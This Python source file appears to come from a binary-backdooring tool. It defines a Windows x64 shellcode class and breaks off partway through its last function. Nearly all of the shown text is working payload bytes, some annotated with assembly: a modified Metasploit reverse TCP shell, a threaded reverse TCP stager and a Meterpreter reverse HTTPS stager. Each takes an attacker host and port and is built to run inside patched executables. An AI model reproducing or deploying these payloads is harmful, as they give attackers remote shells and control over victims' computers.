"""

Copyright (c) 2013-2015, Joshua Pitts
All rights reserved.

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met:

    1. Redistributions of source code must retain the above copyright notice,
    this list of conditions and the following disclaimer.

    2. Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

    3. Neither the name of the copyright holder nor the names of its contributors
    may be used to endorse or promote products derived from this software without
    specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
POSSIBILITY OF SUCH DAMAGE.

"""

##########################################################
#               BEGIN win64 shellcodes                   #
##########################################################

import struct


class winI64_shellcode():
    """
    Windows Intel x64 shellcode class
    """

    def __init__(self, host, port, supplied_shellcode):
        self.host = host
        self.port = port
        self.supplied_shellcode = supplied_shellcode
        self.shellcode1 = None
        self.shellcode2 = None
        self.hostip = None
        self.stackpreserve = (b"\x90\x90\x50\x53\x51\x52\x56\x57\x54\x55\x41\x50"
                              b"\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              )

        self.stackrestore = (b"\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                             b"\x41\x58\x5d\x5c\x5f\x5e\x5a\x59\x5b\x58"
                             )

    def __pack_ip_addresses(self):
        hostocts = []
        for i, octet in enumerate(self.host.split('.')):
                hostocts.append(int(octet))
        self.hostip = struct.pack('=BBBB', hostocts[0], hostocts[1],
                                  hostocts[2], hostocts[3])
        return self.hostip

    def reverse_shell_tcp(self):
        """
        Modified metasploit windows/x64/shell_reverse_tcp
        """

        self.shellcode1 = (b"\xfc"
                           b"\x48\x83\xe4\xf0"
                           b"\xe8")

        self.shellcode1 += b"\xc0\x00\x00\x00"

        self.shellcode1 += (b"\x41\x51\x41\x50\x52"
                            b"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
                            b"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
                            b"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
                            b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
                            b"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
                            b"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
                            b"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
                            b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
                            b"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
                            b"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
                            b"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
                            b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
                            b"\x8b\x12\xe9\x57\xff\xff\xff")

        self.shellcode2 = (b"\x5d\x49\xbe\x77\x73\x32\x5f\x33"
                           b"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
                           b"\x49\x89\xe5\x49\xbc\x02\x00")
        self.shellcode2 += struct.pack('!H', self.port)
        self.shellcode2 += self.__pack_ip_addresses()
        self.shellcode2 += (b"\x41\x54"
                            b"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"
                            b"\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff"
                            b"\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2"
                            b"\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
                            b"\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99"
                            b"\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x49\xb8\x63"
                            b"\x6d\x64\x00\x00\x00\x00\x00\x41\x50\x41\x50\x48\x89\xe2\x57"
                            b"\x57\x57\x4d\x31\xc0\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44"
                            b"\x24\x54\x01\x01\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6"
                            b"\x56\x50\x41\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff"
                            b"\xc8\x4d\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5"
                            b"\x48\x31\xd2\x90\x90\x90\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
                            b"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48"
                            b"\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13"
                            b"\x72\x6f\x6a\x00\x59\x41\x89\xda"
                            b"\x48\x81\xc4\xf8\x00\x00\x00"  # Add RSP X ; align stack
                            )

        return self.stackpreserve + self.shellcode1 + self.shellcode2 + self.stackrestore

    def reverse_tcp_stager_threaded(self):
        """
        Ported the x32 payload from msfvenom for patching win32 binaries (shellcode1)
        with the help of Steven Fewer's work on msf win64 payloads.
        windows/x64/shell/reverse_tcp - 422 bytes (stage 1)
        windows/x64/meterpreter/reverse_tcp will work with this
        """

        # overloading the class stackpreserve
        self.stackpreserve = (b"\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50"
                              b"\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              )

        self.shellcode2 = b"\xE8\xB8\xFF\xFF\xFF"
        # Payload
        self.shellcode2 += (b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
                            b"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
                            b"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
                            b"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
                            b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
                            b"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
                            b"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
                            b"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
                            b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
                            b"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
                            b"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
                            b"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
                            b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
                            b"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
                            b"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00"
                            b"\x49\x89\xe5\x49\xbc\x02\x00"
                            )
        self.shellcode2 += struct.pack('!H', self.port)
        self.shellcode2 += self.__pack_ip_addresses()
        self.shellcode2 += (b"\x41\x54"
                            b"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c"
                            b"\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff"
                            b"\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2"
                            b"\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48"
                            b"\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99"
                            b"\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x48\x83\xec"
                            b"\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9\x41"
                            b"\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x83\xc4\x20\x5e\x6a\x40\x41"
                            b"\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41"
                            b"\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
                            b"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8"
                            b"\x5f\xff\xd5\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xe1\x41"
                            b"\xff\xe7"
                            )

        self.shellcode1 = (b"\x90"                              # <--THAT'S A NOP. \o/
                           b"\xe8\xc0\x00\x00\x00"              # jmp to allocate
                           # api_call
                           b"\x41\x51"                          # push r9
                           b"\x41\x50"                          # push r8
                           b"\x52"                              # push rdx
                           b"\x51"                              # push rcx
                           b"\x56"                              # push rsi
                           b"\x48\x31\xD2"                      # xor rdx,rdx
                           b"\x65\x48\x8B\x52\x60"              # mov rdx,qword ptr gs:[rdx+96]
                           b"\x48\x8B\x52\x18"                  # mov rdx,qword ptr [rdx+24]
                           b"\x48\x8B\x52\x20"                  # mov rdx,qword ptr[rdx+32]
                           # next_mod
                           b"\x48\x8b\x72\x50"                  # mov rsi,[rdx+80]
                           b"\x48\x0f\xb7\x4a\x4a"              # movzx rcx,word [rdx+74]
                           b"\x4d\x31\xc9"                      # xor r9,r9
                           # loop_modname
                           b"\x48\x31\xc0"                      # xor rax,rax
                           b"\xac"                              # lods
                           b"\x3c\x61"                          # cmp al, 61h (a)
                           b"\x7c\x02"                          # jl 02
                           b"\x2c\x20"                          # sub al, 0x20
                           # not_lowercase
                           b"\x41\xc1\xc9\x0d"                  # ror r9d, 13
                           b"\x41\x01\xc1"                      # add r9d, eax
                           b"\xe2\xed"                          # loop until read, back to xor rax, rax
                           b"\x52"                              # push rdx ; Save the current pos in the module list
                           b"\x41\x51"                          # push r9 ; Save the current module hash for later
                                                                # ; Proceed to itterate the export address table,
                           b"\x48\x8b\x52\x20"                  # mov rdx, [rdx+32] ; Get this modules base address
                           b"\x8b\x42\x3c"                      # mov eax, dword [rdx+60] ; Get PE header
                           b"\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address
                           b"\x8b\x80\x88\x00\x00\x00"          # mov eax, dword [rax+136] ; Get export tables RVA
                           b"\x48\x85\xc0"                      # test rax, rax; Test if no export addr table is present
                           b"\x74\x67"                          # je get_next_mod1 ; If no EAT present, process next
                           b"\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address
                           b"\x50"                              # push rax ; Save the current modules EAT
                           b"\x8b\x48\x18"                      # mov ecx, dword [rax+24] ; Get the number of function
                           b"\x44\x8b\x40\x20"                  # mov r8d, dword [rax+32] ; Get the rva of the function
                           b"\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                                                                # ; Computing the module hash + function hash
                           # get_next_func: ;
                           b"\xe3\x56"                          # jrcxz get_next_mod; When we reach the start of the EAT
                           b"\x48\xff\xc9"                      # dec rcx ; Decrement the function name counter
                           b"\x41\x8b\x34\x88"                  # mov esi, dword [r8+rcx*4]; Get rva of next module name
                           b"\x48\x01\xd6"                      # add rsi, rdx ; Add the modules base address
                           b"\x4d\x31\xc9"                      # xor r9, r9 ; Clear r9 which will store the hash
                                                                #  ; of the function and compare it to the one we want
                           # loop_funcname: ;
                           b"\x48\x31\xc0"                      # xor rax, rax ; Clear rax
                           b"\xac"                              # lodsb ; Read in the next byte of the ASCII function
                           b"\x41\xc1\xc9\x0d"                  # ror r9d, 13 ; Rotate right our hash value
                           b"\x41\x01\xc1"                      # add r9d, eax ; Add the next byte of the name
                           b"\x38\xe0"                          # cmp al, ah ; Compare AL (the next of the name) to AH
                           b"\x75\xf1"                          # jne loop_funcname ; not reached the null terminator
                           b"\x4c\x03\x4c\x24\x08"              # add r9, [rsp+8] ; Add current module hash to the hash
                           b"\x45\x39\xd1"                      # cmp r9d, r10d ; Compare the hash
                           b"\x75\xd8"                          # jnz get_next_func ; Go compute the next function hash
                                                                # ; If found, fix up stack, call the function
                           b"\x58"                              # pop rax ; Restore the current modules EAT
                           b"\x44\x8b\x40\x24"                  # mov r8d, dword [rax+36] ; Get the ordinal table rva
                           b"\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                           b"\x66\x41\x8b\x0c\x48"              # mov cx, [r8+2*rcx] ; Get the desired functions ordinal
                           b"\x44\x8b\x40\x1c"                  # mov r8d, dword [rax+28] ; function addresses table rva
                           b"\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                           b"\x41\x8b\x04\x88"                  # mov eax, dword [r8+4*rcx];Get the desired funct. RVA
                           b"\x48\x01\xd0"                      # add rax, rdx; Add modules base addr, get functions VA
                                                                # ; We now fix up the stack and perform the call
                           # finish:
                           b"\x41\x58"                          # pop r8 ; Clear off the current modules hash
                           b"\x41\x58"                          # pop r8 ; Clear off the curr. pos. in the module list
                           b"\x5E"                              # pop rsi ; Restore RSI
                           b"\x59"                              # pop rcx ; Restore the 1st parameter
                           b"\x5A"                              # pop rdx ; Restore the 2nd parameter
                           b"\x41\x58"                          # pop r8 ; Restore the 3rd parameter
                           b"\x41\x59"                          # pop r9 ; Restore the 4th parameter
                           b"\x41\x5A"                          # pop r10 ; pop off the return address
                           b"\x48\x83\xEC\x20"                  # sub rsp, 32 ; reserve space for the register params

                           b"\x41\x52"                          # push r10 ; push back the return address
                           b"\xFF\xE0"                          # jmp rax ; Jump into the required function
                                                                # ; We now automagically return to the correct caller...
                           # get_next_mod:
                           b"\x58"                              # pop rax ; Pop off the current modules EAT
                           # get_next_mod1:
                           b"\x41\x59"                          # pop r9 ; Pop off the current modules hash
                           b"\x5A"                              # pop rdx ; Restore our position in the module list
                           b"\x48\x8B\x12"                      # mov rdx, [rdx] ; Get the next module
                           b"\xe9\x57\xff\xff\xff"              # jmp next_mod ; Process this module
                           )
        # allocate
        self.shellcode1 += (b"\x5d"                              # pop rbp
                            b"\x49\xc7\xc6")                     # mov r14, size of payload below
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)
        self.shellcode1 += (b"\x6a\x40"                          # push 40h
                            b"\x41\x59"                          # pop r9 now 40h
                            b"\x68\x00\x10\x00\x00"              # push 1000h
                            b"\x41\x58"                          # pop r8.. now 1000h
                            b"\x4C\x89\xF2"                      # mov rdx, r14
                            b"\x6A\x00"                          # push 0
                            b"\x59"                              # pop rcx
                            b"\x68\x58\xa4\x53\xe5"              # push E553a458
                            b"\x41\x5A"                          # pop r10
                            b"\xff\xd5"                          # call rbp
                            b"\x48\x89\xc3"                      # mov rbx, rax      ; Store allocated address in ebx
                            b"\x48\x89\xc7"                      # mov rdi, rax      ; Prepare EDI with the new address
                            b"\x48\xC7\xC1"
                            )
        self.shellcode1 += struct.pack("<I", len(self.shellcode2) - 5)

        self.shellcode1 += b"\xeb\x43"

        # got_payload:
        self.shellcode1 += (b"\x5e"                                  # pop rsi            ; Prepare ESI with the source
                            b"\xf2\xa4"                              # rep movsb          ; Copy the payload to RWX mem
                            b"\xe8\x00\x00\x00\x00"                  # call set_handler   ; Configure error handling

                            # set_handler:
                            b"\x48\x31\xC0"  # xor rax,rax

                            b"\x50"                          # push rax            ; LPDWORD lpThreadId (NULL)
                            b"\x50"                          # push rax            ; DWORD dwCreationFlags (0)
                            b"\x49\x89\xC1"                  # mov r9, rax         ; LPVOID lpParameter (NULL)
                            b"\x48\x89\xC2"                  # mov rdx, rax        ; LPTHREAD_START_ROUTINE  (payload)
                            b"\x49\x89\xD8"                  # mov r8, rbx         ; SIZE_T dwStackSize (0 for default)
                            b"\x48\x89\xC1"                  # mov rcx, rax        ; LPSECURITY_ATTRIBUTES (null)
                            b"\x49\xC7\xC2\x38\x68\x0D\x16"  # mov r10, 0x160D6838 ; hash("kernel32.dll","CreateThread")
                            b"\xFF\xD5"                      # call rbp            ; Spawn payload thread
                            b"\x48\x83\xC4\x58"              # add rsp, 50
                            # stackrestore
                            b"\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                            b"\x41\x58\x5d\x5f\x5e\x5a\x59\x5b\x58"
                            )

        self.shellcode1 += b"\xe9"
        self.shellcode1 += struct.pack("<I", len(self.shellcode2))

        return self.stackpreserve + self.shellcode1 + self.shellcode2

    def meterpreter_reverse_https_threaded(self):
        """
        Win64 version
        windows/x64/meterpreter/reverse_https
        """

        # overloading the class stackpreserve
        self.stackpreserve = (b"\x90\x50\x53\x51\x52\x56\x57\x55\x41\x50"
                              b"\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57\x9c"
                              )
        self.shellcode2 = b"\xE8\xB8\xFF\xFF\xFF"

        # payload
        self.shellcode2 += (b"\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52"
                            b"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
                            b"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
                            b"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
                            b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
                            b"\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00"
                            b"\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b"
                            b"\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
                            b"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
                            b"\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
                            b"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b"
                            b"\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41"
                            b"\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41"
                            b"\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff"
                            b"\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56"
                            b"\x49\x89\xe6\x4c\x89\xf1\x49\xba\x4c\x77\x26\x07\x00\x00\x00"
                            b"\x00\xff\xd5\x6a\x00\x6a\x00\x48\x89\xe1\x48\x31\xd2\x4d\x31"
                            b"\xc0\x4d\x31\xc9\x41\x50\x41\x50\x49\xba\x3a\x56\x79\xa7\x00"
                            b"\x00\x00\x00\xff\xd5\xe9\x9e\x00\x00\x00\x5a\x48\x89\xc1\x49"
                            b"\xb8")
        self.shellcode2 += struct.pack("<H", self.port)
        self.shellcode2 += (b"\x00\x00\x00\x00\x00\x00\x4d\x31\xc9\x41\x51\x41"
                            b"\x51\x6a\x03\x41\x51\x49\xba\x57\x89\x9f\xc6\x00\x00\x00\x00"
                            b"\xff\xd5\xeb\x7c\x48\x89\xc1\x48\x31\xd2\x41\x58\x4d\x31\xc9"
                            b"\x52\x68\x00\x32\xa0\x84\x52\x52\x49\xba\xeb\x55\x2e\x3b\x00"
                            b"\x00\x00\x00\xff\xd5\x48\x89\xc6\x6a\x0a\x5f\x48\x89\xf1\x48"
                            b"\xba\x1f\x00\x00\x00\x00\x00\x00\x00\x6a\x00\x68\x80\x33\x00"
                            b"\x00\x49\x89\xe0\x49\xb9\x04\x00\x00\x00\x00\x00\x00\x00\x49"
                            b"\xba\x75\x46\x9e\x86\x00\x00\x00\x00\xff\xd5\x48\x89\xf1\x48"
                            b"\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x52\x52\x49\xba\x2d\x06\x18"
                            b"\x7b\x00\x00\x00\x00\xff\xd5\x85\xc0\x75\x24\x48\xff\xcf\x74"
                            b"\x13\xeb\xb1\xe9\x81\x00\x00\x00\xe8\x7f\xff\xff\xff\x2f\x75"
                            b"\x47\x48\x58\x00\x00\x49\xbe\xf0\xb5\xa2\x56\x00\x00\x00\x00"
                            b"\xff\xd5\x48\x31\xc9\x48\xba\x00\x00\x40\x00\x00\x00\x00\x00"
                            b"\x49\xb8\x00\x10\x00\x00\x00\x00\x00\x00\x49\xb9\x40\x00\x00"
                            b"\x00\x00\x00\x00\x00\x49\xba\x58\xa4\x53\xe5\x00\x00\x00\x00"
                            b"\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda"
                            b"\x49\xb8\x00\x20\x00\x00\x00\x00\x00\x00\x49\x89\xf9\x49\xba"
                            b"\x12\x96\x89\xe2\x00\x00\x00\x00\xff\xd5\x48\x83\xc4\x20\x85"
                            b"\xc0\x74\x99\x48\x8b\x07\x48\x01\xc3\x48\x85\xc0\x75\xce\x58"
                            b"\x58\xc3\xe8\xd7\xfe\xff\xff")
        self.shellcode2 += self.host.encode('Ascii')
        self.shellcode2 += b"\x00"

        self.shellcode1 = (b"\x90"                              # <--THAT'S A NOP. \o/
                           b"\xe8\xc0\x00\x00\x00"              # jmp to allocate
                           # api_call
                           b"\x41\x51"                          # push r9
                           b"\x41\x50"                          # push r8
                           b"\x52"                              # push rdx
                           b"\x51"                              # push rcx
                           b"\x56"                              # push rsi
                           b"\x48\x31\xD2"                      # xor rdx,rdx
                           b"\x65\x48\x8B\x52\x60"              # mov rdx,qword ptr gs:[rdx+96]
                           b"\x48\x8B\x52\x18"                  # mov rdx,qword ptr [rdx+24]
                           b"\x48\x8B\x52\x20"                  # mov rdx,qword ptr[rdx+32]
                           # next_mod
                           b"\x48\x8b\x72\x50"                  # mov rsi,[rdx+80]
                           b"\x48\x0f\xb7\x4a\x4a"              # movzx rcx,word [rdx+74]
                           b"\x4d\x31\xc9"                      # xor r9,r9
                           # loop_modname
                           b"\x48\x31\xc0"                      # xor rax,rax
                           b"\xac"                              # lods
                           b"\x3c\x61"                          # cmp al, 61h (a)
                           b"\x7c\x02"                          # jl 02
                           b"\x2c\x20"                          # sub al, 0x20
                           # not_lowercase
                           b"\x41\xc1\xc9\x0d"                  # ror r9d, 13
                           b"\x41\x01\xc1"                      # add r9d, eax
                           b"\xe2\xed"                          # loop until read, back to xor rax, rax
                           b"\x52"                              # push rdx ; Save the current position in the module lis
                           b"\x41\x51"                          # push r9 ; Save the current module hash for later
                                                                # ; Proceed to itterate the export address table,
                           b"\x48\x8b\x52\x20"                  # mov rdx, [rdx+32] ; Get this modules base address
                           b"\x8b\x42\x3c"                      # mov eax, dword [rdx+60] ; Get PE header
                           b"\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address
                           b"\x8b\x80\x88\x00\x00\x00"          # mov eax, dword [rax+136] ; Get export tables RVA
                           b"\x48\x85\xc0"                      # test rax, rax ; Test if no export addrtable is present
                           b"\x74\x67"                          # je get_next_mod1 ; If no EAT present, process next
                           b"\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address
                           b"\x50"                              # push rax ; Save the current modules EAT
                           b"\x8b\x48\x18"                      # mov ecx, dword [rax+24] ; Get the number of function
                           b"\x44\x8b\x40\x20"                  # mov r8d, dword [rax+32] ; Get the rva of the function
                           b"\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address

                           # get_next_func: ;
                           b"\xe3\x56"                          # jrcxz get_next_mod; When we reach the start of the EAT
                           b"\x48\xff\xc9"                      # dec rcx ; Decrement the function name counter
                           b"\x41\x8b\x34\x88"                  # mov esi, dword [r8+rcx*4]; Get rva of next module name
                           b"\x48\x01\xd6"                      # add rsi, rdx ; Add the modules base address
                           b"\x4d\x31\xc9"                      # xor r9, r9 ; Clear r9 which will store the hash
                                                                #  ; And compare it to the one we wan
                           # loop_funcname: ;
                           b"\x48\x31\xc0"                      # xor rax, rax ; Clear rax
                           b"\xac"                              # lodsb ; Read in the next byte of the ASCII function
                           b"\x41\xc1\xc9\x0d"                  # ror r9d, 13 ; Rotate right our hash value
                           b"\x41\x01\xc1"                      # add r9d, eax ; Add the next byte of the name
                           b"\x38\xe0"                          # cmp al, ah ; Compare AL to AH (null)
                           b"\x75\xf1"                          # jne loop_funcname ; continue
                           b"\x4c\x03\x4c\x24\x08"              # add r9, [rsp+8] ; Add the current module hash
                           b"\x45\x39\xd1"                      # cmp r9d, r10d ; Compare the hash
                           b"\x75\xd8"                          # jnz get_next_func ; Go compute the next function hash

                           b"\x58"                              # pop rax ; Restore the current modules EAT
                           b"\x44\x8b\x40\x24"                  # mov r8d, dword [rax+36] ; Get the ordinal table rva
                           b"\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                           b"\x66\x41\x8b\x0c\x48"              # mov cx, [r8+2*rcx] ; Get the desired functions ordinal
                           b"\x44\x8b\x40\x1c"                  # mov r8d, dword [rax+28] ; Get the funct addr.table rva
                           b"\x49\x01\xd0"                      # add r8, rdx ; Add the modules base address
                           b"\x41\x8b\x04\x88"                  # mov eax, dword [r8+4*rcx]; Get the desired funcc RVA
                           b"\x48\x01\xd0"                      # add rax, rdx ; Add the modules base address to get VA

                           # finish:
                           b"\x41\x58"                          # pop r8 ; Clear off the current modules hash
                           b"\x41\x58"                          # pop r8 ; Clear off the current pos in the module list
                           b"\x5E"                              # pop rsi ; Restore RSI
                           b"\x59"                              # pop rcx ; Restore the 1st parameter
                           b"\x5A"                              # pop rdx ; Restore the 2nd parameter
                           b"\x41\x58"                          # pop r8 ; Restore the 3rd parameter
                           b"\x41\x59"                          # pop r9 ; Restore the 4th parameter
                           b"\x41\x5A"                          # pop r10 ; pop off the return address
                           b"\x48\x83\xEC\x20"                  # sub rsp, 32 ; reserve space for the register params

                           b"\x41\x52"                          # push r10 ; push back the return address
                           b"\xFF\xE0"                          # jmp rax ; Jump into the required function

                           # get_next_mod: ;
                           b"\x58"                              # pop rax ; Pop off the current modules EAT
                           # get_next_mod1: ;
                           b"\x41\x59"                          # pop r9 ; Pop off the current modules hash
                           b"\x5A"                              # pop rdx ; Restore our position in the module list
                           b"\x48\x8B\x12"                      # mov rdx, [rdx] ; Get the next module
                           b"\xe9\x57\xff\xff\xff"              # jmp next_mod ; Process this module
                           )
        # allocate
        self.shellcode1 += (b"\x5d"                              # pop rbp
                            b"\x49\xc7\xc6"                      # mov r14, 1abh size of payload...
                            )
        self.shellcode1 += struct.pack("<H", len(self.shellcode2) - 5)
        self.shellcode1 += (b"\x00\x00"
                            b"\x6a\x40"                          # push 40h
                            b"\x41\x59"                          # pop r9 now 40h
                            b"\x68\x00\x10\x00\x00"              # push 1000h
                            b"\x41\x58"                          # pop r8.. now 1000h
                            b"\x4C\x89\xF2"                      # mov rdx, r14
                            b"\x6A\x00"                          # push 0
                            b"\x59"                              # pop rcx
                            b"\x68\x58\xa4\x53\xe5"              # push E553a458
                            b"\x41\x5A"                          # pop r10
                            b"\xff\xd5"                          # call rbp
                            b"\x48\x89\xc3"                      # mov rbx, rax      ; Store allocated address in ebx
                            b"\x48\x89\xc7"                      # mov rdi, rax      ; Prepare EDI with the new address
                            )

        self.shellcode1 += b"\x48\xc7\xc1"
        self.shellcode1 += struct.pack("<H", len(self.shellcode2) - 5)
        self.shellcode1 += b"\x00\x00"

        # Call the get_payload right before the payload
        self.shellcode1 += b"\xeb\x43"

        # got_payload:
        self.shellcode1 += (b"\x5e"                                  # pop rsi            ; Prepare ESI with the source
                            b"\xf2\xa4"                              # rep movsb          ; Copy the payload to RWX mem
                            b"\xe8\x00\x00\x00\x00"                  # call set_handler   ; Configure error handling

                            # set_handler:
                            b"\x48\x31\xC0"                  # xor rax,rax
                            b"\x50"                          # push rax            ; LPDWORD lpThreadId (NULL)
                            b"\x50"                          # push rax            ; DWORD dwCreationFlags (0)
                            b"\x49\x89\xC1"                  # mov r9, rax         ; LPVOID lpParameter (NULL)
                            b"\x48\x89\xC2"                  # mov rdx, rax        ; LPTHREAD_START_ROUTINE  (payload)
